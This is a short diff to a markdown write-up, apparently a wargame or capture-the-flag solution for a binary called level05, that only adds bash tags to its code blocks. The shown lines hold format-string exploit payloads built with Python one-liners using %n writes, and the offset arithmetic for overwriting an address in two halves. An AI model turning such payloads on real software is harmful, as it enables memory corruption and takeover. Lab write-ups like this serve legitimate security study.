@@ -37,7 +37,7 @@ disas 0x8048370
 
 We craft the payload:
 
-```
+```bash
 (python -c 'print "\x08\x04\x83\x76"[::-1] + "%4294957c%10$n"' ; cat) | ./level05
 ```
 
@@ -51,7 +51,7 @@ As FFFF > D876 we need to write first D876 then FFFF
 55414 - 8 = 55406
 65535 - 55414 = 10121
 
-```
+```bash
 (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55406c%10$n" + "%10121c%11$n"' ; cat) | ./level05
 ```
 
